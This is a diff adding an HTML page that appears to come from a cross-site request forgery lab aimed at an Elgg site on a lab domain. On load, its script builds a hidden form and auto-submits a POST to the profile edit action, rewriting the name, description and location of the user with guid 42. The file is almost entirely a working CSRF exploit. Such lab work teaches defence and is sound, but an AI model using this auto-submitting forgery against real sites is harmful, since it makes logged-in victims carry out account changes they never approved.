@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <h1>This is a post forge page</h1>
+        <!-- 代码来源：https://zhuanlan.zhihu.com/p/38169095-->
+        <script>
+            function post(url,fields){
+                var f = document.createElement("form");
+                f.action = url;
+                f.innerHTML = fields;
+                f.method = "post";
+                document.body.appendChild(f);
+                f.submit();
+            }
+
+            function csrf_hack(){
+                var fields ="";
+                fields += "<input type='hidden' name='name' value='dacao'>";
+                fields += "<input type='hidden' name='briefdescription' value='I am dacao. I am from China.'>";
+                fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+                fields += "<input type='hidden' name='location' value='China'>";
+                fields += "<input type='hidden' name='accesslevel[location]' value='2'>";
+                fields += "<input type='hidden' name='guid' value='42'>";
+                var url = "http://www.csrflabelgg.com/action/profile/edit";
+
+                post(url,fields);
+            }
+
+            window.onload = function() { csrf_hack(); }
+        </script>
+    </body>
+</html>
